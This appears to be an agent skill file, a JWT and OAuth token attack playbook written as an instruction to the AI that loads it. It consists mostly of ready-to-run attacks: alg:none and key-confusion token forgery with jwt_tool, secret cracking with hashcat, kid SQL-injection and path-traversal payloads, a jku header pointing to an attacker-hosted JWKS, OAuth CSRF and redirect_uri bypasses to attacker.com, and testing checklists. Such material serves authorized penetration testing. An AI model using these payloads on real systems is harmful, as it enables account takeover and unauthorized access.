---
name: jwt-oauth-token-attacks
description: >-
  JWT and OAuth token attack playbook. Use when validating token trust, signing algorithms, key handling, claim abuse, bearer flows, and OAuth account-binding weaknesses.
---

# SKILL: JWT and OAuth 2.0 Token Attacks — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert authentication token attacks. Covers JWT cryptographic attacks (alg:none, RS256→ HS256, secret crack, kid/jku injection), OAuth flow attacks (CSRF, open redirect, token theft, implicit flow abuse), PKCE bypass, and token leakage via Referer/logs.

## 0. RELATED ROUTING

- [oauth oidc misconfiguration](../oauth-oidc-misconfiguration/SKILL.md) for redirect URI, state, nonce, PKCE, and account-binding validation
- [cors cross origin misconfiguration](../cors-cross-origin-misconfiguration/SKILL.md) when browser-readable APIs or token leakage may exist cross-origin
- [saml sso assertion attacks](../saml-sso-assertion-attacks/SKILL.md) when the target uses enterprise SSO outside OAuth/OIDC

---

## 1. JWT ANATOMY

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyMzQsInJvbGUiOiJ1c2VyIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
--- HEADER ---             --- PAYLOAD ---                    --- SIGNATURE ---
```

**Decode**:
```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# {"alg":"HS256","typ":"JWT"}
```

**Common claim targets**:
```json
{"role": "admin", "isAdmin": true, "userId": OTHER_USER_ID, "sub": "admin"}
```

---

## 2. ATTACK 1 — ALGORITHM NONE (alg:none)

```bash
# Modify header to alg:none, remove signature:
HEADER.PAYLOAD.

# jwt_tool automation:
python3 jwt_tool.py JWT_TOKEN -X a
```

---

## 3. ATTACK 2 — RS256 TO HS256 KEY CONFUSION

```bash
# Server uses RSA public key for verification
# Attack: set alg to HS256, sign with public key as HMAC secret
python3 jwt_tool.py JWT_TOKEN -X k -pk public_key.pem
```

---

## 4. ATTACK 3 — JWT SECRET BRUTE FORCE

```bash
hashcat -a 0 -m 16500 "JWT_TOKEN_HERE" /usr/share/wordlists/rockyou.txt
john --format=HMAC-SHA256 --wordlist=rockyou.txt jwt.txt
python3 jwt_tool.py JWT_TOKEN -C -d /path/to/wordlist.txt
```

---

## 5. ATTACK 4 — kid (Key ID) INJECTION

### kid SQL Injection
```json
{"alg":"HS256","kid":"' UNION SELECT 'attacker_key' FROM dual--"}
```

### kid Path Traversal
```json
{"alg":"HS256","kid":"../../../../dev/null"}
```
Server reads `/dev/null` as key → empty string → sign with empty HMAC.

---

## 6. ATTACK 5 — jku / x5u Header Injection

```json
{"alg":"RS256","jku":"https://attacker.com/malicious-jwks.json","kid":"my-key"}
```

```bash
# Generate RSA key pair and host JWKS at attacker.com
openssl genrsa -out private.pem 2048
# Sign JWT with private key, server fetches attacker's JWKS to verify
python3 jwt_tool.py JWT -X s -ju https://attacker.com/malicious-jwks.json
```

---

## 7. OAUTH 2.0 — STATE PARAMETER MISSING (CSRF)

```
Attack:
1. Start OAuth login → get authorization URL with code
2. Craft: https://target.com/oauth/callback?code=ATTACKER_CODE
3. Victim clicks URL → their session binds to attacker's OAuth identity
→ ACCOUNT TAKEOVER
```

---

## 8. OAUTH — REDIRECT_URI BYPASS

```
Original: redirect_uri=https://target.com/callback
Attack:   redirect_uri=https://target.com/callback/../../../attacker.com
          redirect_uri=https://attacker.com.target.com/callback
          redirect_uri=https://target.com@attacker.com/callback
```

---

## 9. JWT TESTING CHECKLIST

```
[] Decode header + payload
[] Test alg:none
[] If RS256: find public key -> attempt RS256->HS256 confusion
[] If HS256: brute force with hashcat/rockyou
[] Check kid parameter -> SQL injection + path traversal
[] Check jku/x5u header -> redirect to attacker JWKS
[] Test token reuse after logout
[] Test expired token acceptance (exp claim)
```

---

## 10. OAUTH TESTING CHECKLIST

```
[] Check for state parameter in authorization request
[] Test redirect_uri manipulation
[] Can tokens be exchanged more than once?
[] Test scope escalation during token exchange
[] Implicit flow: check for token in Referer/history
[] PKCE: can code_challenge be bypassed?
[] Check authorization code reuse
[] Test account linking abuse: link OAuth with same email
```
